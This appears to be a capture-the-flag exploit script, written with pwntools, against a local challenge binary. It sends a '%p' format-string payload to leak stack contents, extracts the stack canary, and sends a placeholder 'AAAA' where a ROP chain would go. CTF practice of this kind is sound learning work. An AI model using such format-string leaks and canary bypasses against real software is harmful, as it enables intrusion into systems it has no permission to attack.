from pwn import *

p = process("./chall", env={"LD_PRELOAD": "./libc.so.6"})

input("attach gdb")

t = p.recvuntil("name: ")

leak = b'%p '*50
p.sendline(leak)

leaked = p.recvuntil("[y/n]: ")

print(leaked)

leaked = leaked.split(b' ')

canary = leaked[-24]

log.info(b"Canaray leaked: " + canary)


p.sendline(b'y')

p.recvuntil("\n")

rop = b'AAAA'

p.sendline(rop)

t = p.recv()
print(t)

p.interactive()

